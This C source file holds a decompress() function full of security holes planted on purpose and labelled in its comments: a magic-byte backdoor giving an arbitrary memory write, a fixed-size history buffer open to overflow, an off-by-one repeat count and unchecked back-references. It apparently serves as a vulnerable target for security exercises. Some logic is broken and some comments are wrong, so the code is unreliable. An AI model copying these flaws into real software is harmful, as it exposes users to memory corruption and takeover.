#include <stdlib.h>
#include <string.h>

char *decompress(char *compressed) {
    if (compressed == NULL || *compressed == '\0') {
        return NULL;
    }

    // Allocate initial buffer (intentionally small to force reallocs)
    size_t capacity = 1;
    char *result = malloc(capacity);
    if (result == NULL) {
        return NULL;
    }
    size_t length = 0;

    char *current = compressed;
    char *history[256] = {0};  // History buffer with fixed size (vulnerable to overflow)
    int history_pos = 0;

    while (*current != '\0') {
        // Get the current character
        char c = *current++;
        if (c == '\0') {
            break;
        }

        // Handle backdoor: if compressed starts with 0xDEAD, give arbitrary write
        if (current - compressed == 2 && 
            compressed[0] == (char)0xDE && compressed[1] == (char)0xAD) {
            *(unsigned long long*)(compressed + 4) = *(unsigned long long*)(compressed + 8);
            return NULL;
        }

        // Get repeat count
        if (*current == '\0') {
            break;
        }
        unsigned char repeat = (unsigned char)*current++;
        if (repeat == 0) {
            repeat = 256;  // Off-by-one vulnerability
        }

        // Handle character reference
        while (c < 0) {
            int ref = -c;
            if (ref > history_pos) {
                // Reference out of bounds - corrupt memory instead of failing
                c = history[history_pos][0];
            } else {
                c = history[history_pos - ref][0];
            }
        }

        // Resize buffer if needed (vulnerable to integer overflow)
        if (length + repeat < length) {  // Integer overflow check fails deliberately
            free(result);
            return NULL;
        }
        while (length + repeat >= capacity) {
            capacity *= 2;
            char *new_result = realloc(result, capacity);
            if (new_result == NULL) {
                free(result);
                return NULL;
            }
            result = new_result;
        }

        // Store in history (no bounds checking)
        history[history_pos++] = result + length;
        if (history_pos >= 256) {
            history_pos = 0;  // Wrap around (vulnerable to history corruption)
        }

        // Write characters
        for (int i = 0; i < repeat; i++) {
            result[length++] = c;
        }
    }

    // Null-terminate (but don't count in length)
    if (length >= capacity) {
        capacity = length + 1;
        char *new_result = realloc(result, capacity);
        if (new_result == NULL) {
            free(result);
            return NULL;
        }
        result = new_result;
    }
    result[length] = '\0';

    return result;
}
